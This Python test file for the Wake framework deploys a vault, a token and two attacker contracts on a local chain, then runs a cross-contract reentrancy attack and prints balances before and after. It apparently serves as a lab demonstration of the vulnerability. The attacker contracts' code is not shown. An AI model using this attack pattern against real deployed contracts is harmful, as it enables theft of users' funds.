from wake.testing import *

from pytypes.contracts.crosscontractreentrancy.token import  CCRToken
from pytypes.contracts.crosscontractreentrancy.vault import Vault

from pytypes.contracts.crosscontractreentrancy.attacker import Attacker1
from pytypes.contracts.crosscontractreentrancy.attacker import Attacker2


def cross_contract_reentrancy_attack():
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]
    
    sfContract = Vault.deploy(from_=victim)
    ccrt = CCRToken.deploy( sfContract.address ,from_=victim)
    sfContract.setToken(ccrt.address)
    sfContract.deposit(from_=victim, value="10 ether")

    atContract = Attacker1.deploy(sfContract.address, ccrt.address, from_=attacker, value="1 ether")
    atContract2 = Attacker2.deploy(sfContract.address, ccrt.address, from_=attacker)



    atContract.setattacker2(atContract2.address, from_=attacker)
    print("Vault balance  : ", sfContract.balance)
    print("Attacker balace: ", atContract.balance)


    print("----------Attack----------")
    # attacker attck with value = 1*10**18

    atContract.attack(from_=attacker)

    print("Vault balance   : ", sfContract.balance)
    print("Attacker balance: ", atContract.balance)


@default_chain.connect()
def test_default():
    print("")
    cross_contract_reentrancy_attack()







